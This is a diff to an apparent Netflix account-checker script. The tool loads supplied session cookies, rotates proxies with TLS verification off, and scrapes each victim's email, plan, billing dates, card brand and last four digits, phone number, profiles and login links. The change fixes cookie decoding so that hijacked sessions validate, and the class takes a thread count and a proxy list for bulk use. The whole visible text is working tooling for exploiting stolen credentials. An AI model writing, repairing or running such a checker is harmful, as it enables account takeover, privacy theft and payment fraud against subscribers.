@@ -158,14 +158,23 @@ def check_account(cookies: dict, proxy=None, timeout=20):
 
     sess = requests.Session()
     sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
-    for k, v in cookies.items(): sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
+    
+    # CORRECCIÓN: Decodificar las cookies antes de asignarlas
+    for k, v in cookies.items(): 
+        # urllib.parse.unquote convierte %3D en =, %26 en &, etc.
+        decoded_key = urllib.parse.unquote(k)
+        decoded_value = urllib.parse.unquote(v)
+        sess.cookies.set(decoded_key, str(decoded_value), domain=".netflix.com", path="/")
+        
     if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
 
     try:
         r = sess.get("https://www.netflix.com/account", allow_redirect=True, timeout=timeout)
     except: return None
 
+    # Si nos redirige a login, la cookie era inválida o expirada
     if "login" in r.url.lower() or r.status_code in (401,403): return None
+    
     html = r.text
 
     if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
@@ -225,7 +234,6 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
 
     return {"email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),"plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A","member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,"can_change":can_change,"video_quality":quality,"max_streams":str(streams),"extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A","payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,"profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A","netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,"login_tv":login_tv}
-
 class NetflixChecker:
     def __init__(self, threads=5, proxy_list=None, timeout=20):
         self.threads = threads
